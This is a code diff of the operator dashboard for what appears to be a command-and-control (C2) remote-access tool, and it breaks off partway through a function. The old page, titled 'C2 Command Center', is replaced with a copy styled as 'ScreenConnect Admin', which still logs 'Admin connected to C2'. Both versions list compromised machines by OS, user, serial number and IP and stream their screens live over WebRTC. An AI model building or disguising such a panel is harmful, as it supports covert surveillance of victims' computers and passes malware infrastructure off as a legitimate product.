@@ -407,412 +407,923 @@ const adminHTML = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <title>C2 Command Center</title>
- <style>
- body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
- h1 { margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
- .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
- .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; transition: transform 0.2s; position: relative; }
- .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
- .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; font-weight: bold; }
- .btn:hover { background: #2563eb; }
- .btn.active { background: #10b981; }
- .btn-force { background: #f59e0b; margin-top: 5px; }
- .btn-force:hover { background: #d97706; }
- .btn-danger { background: #ef4444; margin-top: 5px; }
- .btn-danger:hover { background: #dc2626; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ScreenConnect Admin</title>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
- /* Video Modal */
- #videoModal {
- display: none;
- position: fixed;
- top: 0; left: 0; width: 100%; height: 100%;
- background: rgba(0,0,0,0.95);
- z-index: 1000;
- justify-content: center;
- align-items: center;
- flex-direction: column;
- }
- #videoModal video {
- width: 80%;
- max-height: 80%;
- background: #000;
- border: 2px solid #3b82f6;
- }
- #closeVideo {
- position: absolute;
- top: 20px;
- right: 20px;
- background: red;
- color: white;
- border: none;
- padding: 10px 20px;
- cursor: pointer;
- font-size: 16px;
- z-index: 1001;
- }
+    <style>
+        /* --- CSS Variables for Premium Theme --- */
+        :root {
+            --bg-base: #080b12;         /* Deepest background */
+            --bg-surface: #0f1523;      /* Panel background */
+            --bg-surface-hover: #182033;/* Hover states */
+            --bg-glass: rgba(15, 21, 35, 0.7);
+            --text-main: #e2e8f0;       /* Primary text */
+            --text-muted: #64748b;      /* Secondary text */
+            --accent: #0ea5e9;          /* Sky blue accent */
+            --accent-glow: rgba(14, 165, 233, 0.4);
+            --success: #10b981;         /* Green */
+            --success-glow: rgba(16, 185, 129, 0.3);
+            --border: #1e293b;          /* Subtle borders */
+            --border-light: rgba(255, 255, 255, 0.05);
+        }
 
- /* Logs Container */
- #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
- .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
- .log-time { color: #64748b; margin-right: 8px; }
- .log-alert-green { color: #4ade80; }
- .log-alert-red { color: #f87171; }
- .log-alert-blue { color: #60a5fa; }
- .log-alert-white { color: #e2e80; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
 
- /* Status Indicators */
- .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
- .status-online { background-color: #4ade80; }
- .status-offline { background-color: #94a3b8; }
- .status-connecting { background-color: #fbbf24; }
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            background-image:
+                radial-gradient(circle at 15% 50%, rgba(14, 165, 233, 0.05), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
+        }
 
- .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
- </style>
+        /* --- Sidebar --- */
+        .sidebar {
+            width: 260px;
+            background-color: var(--bg-glass);
+            backdrop-filter: blur(12px);
+            border-right: 1px solid var(--border-light);
+            display: flex;
+            flex-direction: column;
+            padding: 24px 0;
+            z-index: 10;
+        }
+
+        .logo-area {
+            padding: 0 24px 32px 24px;
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #fff;
+        }
+
+        .logo-area i {
+            color: var(--accent);
+            font-size: 1.4rem;
+            filter: drop-shadow(0 0 8px var(--accent-glow));
+        }
+
+        .nav-menu {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            padding: 0 12px;
+        }
+
+        .nav-item {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            border-radius: 8px;
+            position: relative;
+        }
+
+        .nav-item:hover {
+            background-color: var(--bg-surface-hover);
+            color: var(--text-main);
+        }
+
+        .nav-item.active {
+            background: linear-gradient(90deg, rgba(14, 165, 233, 0.15) 0%, transparent 100%);
+            color: var(--accent);
+            border-left: 3px solid var(--accent);
+            border-radius: 4px 8px 8px 4px;
+        }
+
+        .nav-item i {
+            width: 20px;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+
+        .build-btn-container {
+            padding: 24px;
+            border-top: 1px solid var(--border-light);
+        }
+
+        .build-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--accent), #0284c7);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .build-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px var(--accent-glow);
+        }
+
+        /* --- Main Content --- */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Header */
+        .top-header {
+            height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 32px;
+            border-bottom: 1px solid var(--border-light);
+            background-color: var(--bg-glass);
+            backdrop-filter: blur(12px);
+            z-index: 5;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            padding: 10px 16px;
+            width: 380px;
+            transition: all 0.3s ease;
+        }
+
+        .search-bar:focus-within {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        .search-bar i {
+            color: var(--text-muted);
+            margin-right: 12px;
+        }
+
+        .search-bar input {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            width: 100%;
+            outline: none;
+            font-size: 0.9rem;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 24px;
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+
+        .header-actions i {
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .header-actions i:hover {
+            color: var(--text-main);
+        }
+
+        /* Content Area */
+        .content-body {
+            padding: 32px;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .page-title {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            letter-spacing: -0.5px;
+        }
+
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+
+        .stat-card {
+            background-color: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: rgba(255,255,255,0.1);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--border-light), transparent);
+        }
+
+        .stat-card .title {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+
+        .stat-card .value {
+            font-size: 2.2rem;
+            font-weight: 700;
+        }
+
+        .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
+        .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
+
+        /* Data Table */
+        .data-panel {
+            background-color: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .panel-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border-light);
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255,255,255,0.01);
+        }
+
+        .table-header {
+            display: grid;
+            grid-template-columns: 60px 2fr 2fr 1fr;
+            padding: 16px 24px;
+            background-color: rgba(0, 0, 0, 0.2);
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .table-row {
+            display: grid;
+            grid-template-columns: 60px 2fr 2fr 1fr;
+            padding: 18px 24px;
+            border-bottom: 1px solid var(--border-light);
+            align-items: center;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+
+        .table-row:hover {
+            background-color: var(--bg-surface-hover);
+            transform: scale(1.002);
+        }
+
+        .table-row:last-child {
+            border-bottom: none;
+        }
+
+        /* Custom Checkbox (Styled for visibility) */
+        .custom-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--text-muted);
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s;
+        }
+
+        .table-row:hover .custom-checkbox {
+            border-color: var(--accent);
+        }
+
+        /* Machine Info */
+        .machine-info {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .machine-info .name {
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #fff;
+        }
+
+        .machine-info .name i {
+            color: var(--accent);
+            font-size: 1.1rem;
+        }
+
+        .machine-info .company {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        /* Status Badge */
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .status-dot.online {
+            background-color: var(--success);
+            box-shadow: 0 0 10px var(--success);
+        }
+
+        .status-dot.offline {
+            background-color: var(--text-muted);
+        }
+
+        /* --- REMOTE SESSION MODAL (The "ScreenConnect" Video View) */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .session-container {
+            width: 85vw;
+            height: 85vh;
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--border-light);
+            transform: scale(0.95);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .modal-overlay.active .session-container {
+            transform: scale(1);
+        }
+
+        /* Session Toolbar */
+        .session-toolbar {
+            height: 50px;
+            background: #0f1523;
+            border-bottom: 1px solid var(--border-light);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+
+        .session-title {
+            font-size: 0.9rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .session-title .dot {
+            width: 8px; height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--success);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 var(--success-glow); }
+            70% { box-shadow: 0 0 0 6px transparent; }
+            100% { box-shadow: 0 0 0 0 transparent; }
+        }
+
+        .session-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .tool-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border-light);
+            color: var(--text-main);
+            width: 32px; height: 32px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tool-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .tool-btn.end-session {
+            color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+            border-color: rgba(239, 68, 68, 0.2);
+            width: auto;
+            padding: 0 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            gap: 6px;
+        }
+
+        .tool-btn.end-session:hover {
+            background: rgba(239, 68, 68, 0.2);
+        }
+
+        /* The actual "Video" Screen */
+        .video-screen {
+            flex: 1;
+            background: #020617;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            /* Simulated desktop background */
+            background-image:
+                radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+        }
+
+        .connecting-state {
+            text-align: center;
+            color: var(--text-main);
+        }
+
+        .connecting-state i {
+            font-size: 3rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .connecting-state h2 {
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .connecting-state p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-base); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+    </style>
 </head>
 <body>
- <h1>🛡️ C2 Command Center</h1>
 
- <!-- User Grid -->
- <div class="grid" id="userGrid"></div>
- <div id="emptyState" class="empty-state">Waiting for connections...</div>
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="logo-area">
+            <i class="fa-solid fa-layer-group"></i> ScreenConnect
+        </div>
+        <div class="nav-menu">
+            <a href="#" class="nav-item active"><i class="fa-solid fa-desktop"></i> Machines</a>
+            <a href="#" class="nav-item"><i class="fa-solid fa-users"></i> Users</a>
+            <a href="#" class="nav-item"><i class="fa-solid fa-network-wired"></i> Networks</a>
+            <a href="#" class="nav-item"><i class="fa-solid fa-chart-pie"></i> Analytics</a>
+            <a href="#" class="nav-item"><i class="fa-solid fa-gear"></i> Settings</a>
+        </div>
+        <div class="build-btn-container">
+            <button class="build-btn" onclick="openNewSession()">
+                <i class="fa-solid fa-plus"></i> New Session
+            </button>
+        </div>
+    </aside>
 
- <!-- Live Logs -->
- <h3>Live Event Log</h3>
- <div id="logs-container"></div>
+    <!-- Main Content -->
+    <main class="main-content">
 
- <!-- Video Modal -->
- <div id="videoModal">
- <button id="closeVideo" onclick="closeVideo()">Close</button>
- <video id="remoteVideo" autoplay playsinline></video>
- <!-- Force Live View Button Inside Frame -->
- <button class="btn btn-force" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 200px;" onclick="forceLiveViewFromFrame()">🔄 Force Live Stream</button>
- </div>
+        <!-- Header -->
+        <header class="top-header">
+            <div class="search-bar">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <input type="text" placeholder="Search connected machines..." id="searchInput" onkeyup="filterTable()">
+            </div>
+            <div class="header-actions">
+                <i class="fa-regular fa-bell"></i>
+                <i class="fa-regular fa-circle-question"></i>
+                <div style="width: 32px; height: 32px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.8rem; cursor: pointer;">
+                    JD
+                </div>
+            </div>
+        </header>
 
- <script>
- const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
- const host = window.location.host;
- const wsUrl = \`\${protocol}//\${host}/\`;
+        <!-- Dashboard Body -->
+        <div class="content-body">
+            <h1 class="page-title">Guest Connected</h1>
 
- const ws = new WebSocket(wsUrl);
- let users = {};
- let sessions = {};
- const remoteVideo = document.getElementById('remoteVideo');
+            <!-- Stats Row -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="title">Total Users</span>
+                    <span class="value" id="totalUsers">0</span>
+                </div>
+                <div class="stat-card">
+                    <span class="title">Currently Online</span>
+                    <span class="value online" id="onlineUsers">0</span>
+                </div>
+                <div class="stat-card">
+                    <span class="title">Offline</span>
+                    <span class="value" id="offlineUsers">0</span>
+                </div>
+                <div class="stat-card">
+                    <span class="title">Active Sessions</span>
+                    <span class="value accent" id="activeSessions">0</span>
+                </div>
+            </div>
 
- ws.onopen = () => {
- console.log("Admin connected to C2");
- ws.send(JSON.stringify({ type: 'register_admin' }));
- addLog("Connected to C2 Server", "blue");
- };
+            <!-- Data Table -->
+            <div class="data-panel">
+                <div class="panel-header">
+                    <span>Computer Directory</span>
+                    <i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i>
+                </div>
 
- ws.onmessage = (event) => {
- try {
- const data = JSON.parse(event.data);
+                <div class="table-header">
+                    <div></div>
+                    <div>Computer Name</div>
+                    <div>Company</div>
+                    <div>Status</div>
+                </div>
 
- if (data.type === 'registered') {
- ws.isAdmin = true;
- addLog("Admin Session Registered", "blue");
- }
- else if (data.type === 'alert') {
- addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
- }
- else if (data.type === 'user_update') {
- addLog(\`🟢 New User: \${data.info.os || 'Unknown'} (\${data.info.user || 'Unknown'})\`, 'green');
+                <div id="table-body">
+                    <!-- Rows will be populated by JS -->
+                </div>
+            </div>
+        </div>
+    </main>
 
- if (!users[data.id]) {
- users[data.id] = { status: 'Online', logs: [], info: data.info, lastSeen: data.lastSeen, sessionActive: false };
- } else {
- users[data.id].status = 'Online';
- users[data.id].info = data.info;
- users[data.id].lastSeen = data.lastSeen;
- users[data.id].sessionActive = false;
- }
- renderUsers();
- }
- else if (data.type === 'refresh_users') {
- // Refresh logic handled by real-time updates
- }
- else if (data.type === 'heartbeat') {
- if (users[data.id]) {
- users[data.id].lastSeen = Date.now();
- users[data.id].status = 'Online';
- renderUsers();
- }
- }
- else if (data.type === 'system') {
- addLog(data.message, "blue");
- }
- else if (data.type === 'screen_data') {
- addLog(\`📺 Screen update from \${data.id}\`, 'blue');
- if (!users[data.id]) {
- users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
- }
- users[data.id].lastSeen = Date.now();
- renderUsers();
- }
- else if (data.type === 'system_log') {
- addLog(data.message, 'white');
- }
- else if (data.type === 'offer') {
- addLog(\`[SIG] Received Offer from \${data.targetId}\`, 'green');
- handleWebRTCOffer(data.sdp, data.targetId);
- }
- else if (data.type === 'candidate') {
- addLog(\`[SIG] Received Candidate from \${data.targetId}\`, 'blue');
- handleWebRTCCandidate(data.candidate, data.targetId);
- }
- else if (data.type === 'session_active') {
- if (users[data.agentId]) {
- users[data.agentId].sessionActive = true;
- users[data.agentId].status = 'Online';
- renderUsers();
- addLog(\`[SESSION] Active session established with \${data.agentId}\`, 'green');
- }
- }
- else if (data.type === 'init_users') {
- // Initialize users from DB on admin connect
- users = {};
- data.users.forEach(user => {
- users[user.id] = {
- status: user.status === 'Online' ? 'Online' : 'Offline',
- logs: [],
- info: { os: user.os, user: user.user },
- lastSeen: user.last_seen * 1000,
- sessionActive: false,
- serialNumber: user.serial_number
- };
- });
- renderUsers();
- addLog("Loaded users from Database", "blue");
- }
- else {
- if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'user_update' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
- addLog(\`[\${data.targetId || data.id}] Received: \${data.type}\`, 'blue');
- const userId = data.targetId || data.id;
- if (!users[userId]) {
- users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
- }
- users[userId].logs.push(data.type);
- users[userId].lastSeen = Date.now();
- renderUsers();
- }
- }
- } catch (e) {
- console.error("Error parsing message:", e);
- }
- };
+    <!-- REMOTE SESSION MODAL -->
+    <div class="modal-overlay" id="sessionModal" onclick="closeSession(event)">
+        <div class="session-container" onclick="event.stopPropagation()">
 
- function getSession(targetId) {
- if (!sessions[targetId]) {
- sessions[targetId] = {
- pc: new RTCPeerConnection({
- iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
- }),
- candidates: []
- };
+            <!-- Modal Toolbar -->
+            <div class="session-toolbar">
+                <div class="session-title">
+                    <div class="dot"></div>
+                    <span id="modalMachineName">Connecting...</span>
+                </div>
+                <div class="session-actions">
+                    <button class="tool-btn" title="Full Screen"><i class="fa-solid fa-expand"></i></button>
+                    <button class="tool-btn" title="Send Keys"><i class="fa-solid fa-keyboard"></i></button>
+                    <button class="tool-btn" title="Screenshot"><i class="fa-solid fa-camera"></i></button>
+                    <button class="tool-btn end-session" onclick="closeSession(event)">
+                        <i class="fa-solid fa-power-off"></i> End Session
+                    </button>
+                </div>
+            </div>
 
- const pc = sessions[targetId].pc;
+            <!-- Modal Video Screen -->
+            <div class="video-screen">
+                <!-- Connecting State -->
+                <div class="connecting-state" id="connectingState">
+                    <i class="fa-solid fa-circle-notch"></i>
+                    <h2>Establishing Secure Connection</h2>
+                    <p>Handshaking with remote machine...</p>
+                </div>
 
- pc.ontrack = (event) => {
- remoteVideo.srcObject = event.streams[0];
- addLog(\`[VIDEO] Stream received from \${targetId}\`, 'green');
- document.getElementById('videoModal').style.display = 'flex';
- };
+                <!-- Actual Remote Desktop Video -->
+                <video id="remoteVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain;"></video>
+            </div>
 
- pc.onicecandidate = (event) => {
- if (event.candidate) {
- ws.send(JSON.stringify({
- type: 'candidate',
- targetId: targetId,
- candidate: event.candidate
- }));
- }
- };
+        </div>
+    </div>
 
- pc.oniceconnectionstatechange = () => {
- const state = pc.iceConnectionState;
- addLog(\`[ICE] State: \${state} for \${targetId}\`, state === 'connected' ? 'green' : (state === 'failed' ? 'red' : 'blue'));
- if (state === 'disconnected' || state === 'failed') {
- closeSession(targetId);
- }
- };
+    <!-- Interactive JavaScript -->
+    <script>
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const host = window.location.host;
+        const wsUrl = \`\${protocol}//\${host}/\`;
 
- pc.onicegatheringstatechange = () => {
- addLog(\`[ICE] Gathering: \${pc.iceGatheringState} for \${targetId}\`, 'blue');
- };
- }
- return sessions[targetId];
- }
+        const ws = new WebSocket(wsUrl);
+        let users = {};
+        let sessions = {};
+        const remoteVideo = document.getElementById('remoteVideo');
 
- async function handleWebRTCOffer(offerSDP, targetId) {
- const session = getSession(targetId);
- const pc = session.pc;
+        ws.onopen = () => {
+            console.log("Admin connected to C2");
+            ws.send(JSON.stringify({ type: 'register_admin' }));
+        };
 
- try {
- await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
 
- while (session.candidates.length > 0) {
- const candidate = session.candidates.shift();
- await pc.addIceCandidate(new RTCIceCandidate(candidate));
- }
+                if (data.type === 'registered') {
+                    ws.isAdmin = true;
+                }
+                else if (data.type === 'init_users') {
+                    // Initialize users from DB on admin connect
+                    users = {};
+                    data.users.forEach(user => {
+                        users[user.id] = {
+                            status: user.status === 'Online' ? 'Online' : 'Offline',
+                            info: { os: user.os, user: user.user },
+                            lastSeen: user.last_seen * 1000,
+                            sessionActive: false,
+                            serialNumber: user.serial_number,
+                            ip: user.ip
+                        };
+                    });
+                    renderUsers();
+                }
+                else if (data.type === 'user_update') {
+                    if (!users[data.id]) {
+                        users[data.id] = {
+                            status: 'Online',
+                            info: data.info,
+                            lastSeen: data.lastSeen,
+                            sessionActive: false,
+                            serialNumber: data.info.serialNumber || 'N/A',
+                            ip: data.info.ip || 'Unknown'
+                        };
+                    } else {
+                        users[data.id].status = 'Online';
+                        users[data.id].info = data.info;
+                        users[data.id].lastSeen = data.lastSeen;
+                        users[data.id].sessionActive = false;
+                    }
+                    renderUsers();
+                }
+                else if (data.type === 'heartbeat') {
+                    if (users[data.id]) {
+                        users[data.id].lastSeen = Date.now();
+                        users[data.id].status = 'Online';
+                        renderUsers();
+                    }
+                }
+                else if (data.type === 'offer') {
+                    handleWebRTCOffer(data.sdp, data.targetId);
+                }
+                else if (data.type === 'candidate') {
+                    handleWebRTCCandidate(data.candidate, data.targetId);
+                }
+                else if (data.type === 'session_active') {
+                    if (users[data.agentId]) {
+                        users[data.agentId].sessionActive = true;
+                        users[data.agentId].status = 'Online';
+                        renderUsers();
+                    }
+                }
+                else if (data.type === 'refresh_users') {
+                    // Refresh logic handled by real-time updates
+                }
+            } catch (e) {
+                console.error("Error parsing message:", e);
+            }
+        };
 
- const answer = await pc.createAnswer();
- await pc.setLocalDescription(answer);
+        function getSession(targetId) {
+            if (!sessions[targetId]) {
+                sessions[targetId] = {
+                    pc: new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    }),
+                    candidates: []
+                };
 
- ws.send(JSON.stringify({
- type: 'answer',
- targetId: targetId,
- sdp: pc.localDescription
- }));
+                const pc = sessions[targetId].pc;
 
- addLog(\`[SIG] Answer sent to \${targetId}\`, 'green');
- } catch (err) {
- addLog(\`[WEBRTC] Error handling offer: \${err.message}\`, 'red');
- }
- }
+                pc.ontrack = (event) => {
+                    remoteVideo.srcObject = event.streams[0];
+                    document.getElementById('connectingState').style.display = 'none';
+                };
 
- function handleWebRTCCandidate(candidate, targetId) {
- const session = getSession(targetId);
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        ws.send(JSON.stringify({
+                            type: 'candidate',
+                            targetId: targetId,
+                            candidate: event.candidate
+                        }));
+                    }
+                };
 
- if (session.pc.remoteDescription) {
- session.pc.addIceCandidate(new RTCIceCandidate(candidate))
- .catch(err => addLog(\`[WEBRTC] Error adding candidate: \${err.message}\`, 'red'));
- } else {
- session.candidates.push(candidate);
- }
- }
+                pc.oniceconnectionstatechange = () => {
+                    const state = pc.iceConnectionState;
+                    if (state === 'disconnected' || state === 'failed') {
+                        closeSession(null, true);
+                    }
+                };
+            }
+            return sessions[targetId];
+        }
 
- function closeSession(targetId) {
- if (sessions[targetId]) {
- if (sessions[targetId].pc) {
- sessions[targetId].pc.close();
- }
- delete sessions[targetId];
- addLog(\`[CLOSE] Session closed for \${targetId}\`, 'red');
- }
- }
+        async function handleWebRTCOffer(offerSDP, targetId) {
+            const session = getSession(targetId);
+            const pc = session.pc;
 
- function addLog(msg, colorClass = '') {
- const logContainer = document.getElementById('logs-container');
- const div = document.createElement('div');
- div.className = \`log-entry log-alert-\${colorClass}\`;
- const timeSpan = document.createElement('span');
- timeSpan.className = 'log-time';
- timeSpan.innerText = new Date().toLocaleTimeString();
- const msgSpan = document.createElement('span');
- msgSpan.innerText = msg;
- div.appendChild(timeSpan);
- div.appendChild(msgSpan);
- logContainer.prepend(div);
- if (logContainer.children.length > 100) {
- logContainer.removeChild(logContainer.lastChild);
- }
- }
+            try {
+                await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
 
- function renderUsers() {
- const grid = document.getElementById('userGrid');
- const emptyState = document.getElementById('emptyState');
- grid.innerHTML = '';
- const userCount = Object.keys(users).length;
+                while (session.candidates.length > 0) {
+                    const candidate = session.candidates.shift();
+                    await pc.addIceCandidate(new RTCIceCandidate(candidate));
+                }
 
- if (userCount === 0) {
- emptyState.style.display = 'block';
- return;
- } else {
- emptyState.style.display = 'none';
- }
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
 
- for (const [id, data] of Object.entries(users)) {
- const card = document.createElement('div');
- card.className = 'card';
+                ws.send(JSON.stringify({
+                    type: 'answer',
+                    targetId: targetId,
+                    sdp: pc.localDescription
+                }));
+            } catch (err) {
+                console.error("[WEBRTC] Error handling offer:", err);
+            }
+        }
 
- const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
- const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
- const serial = data.serialNumber || 'N/A';
+        function handleWebRTCCandidate(candidate, targetId) {
+            const session = getSession(targetId);
 
- let statusColor = 'status-offline';
- let btnText = 'Join Session';
- let btnClass = '';
+            if (session.pc.remoteDescription) {
+                session.pc.addIceCandidate(new RTCIceCandidate(candidate))
+                    .catch(err => console.error("[WEBRTC] Error adding candidate:", err));
+            } else {
+                session.candidates.push(candidate);
+            }
+        }
 
- if (data.status === 'Online') {
- statusColor = 'status-online';
- if (data.sessionActive) {
- btnText = 'Reconnect Session';
- btnClass = 'active';
- }
- } else if (data.status === 'Connecting...') {
- statusColor = 'status-connecting';
- btnText = 'Connecting...';
- }
+        function closeSession(e, force = false) {
+            if(e) e.preventDefault();
+            document.getElementById('sessionModal').classList.remove('active');
+            
+            Object.keys(sessions).forEach(sid => {
+                if(sessions[sid].pc) sessions[sid].pc.close();
+                delete sessions[sid];
+            });
+            remoteVideo.srcObject = null;
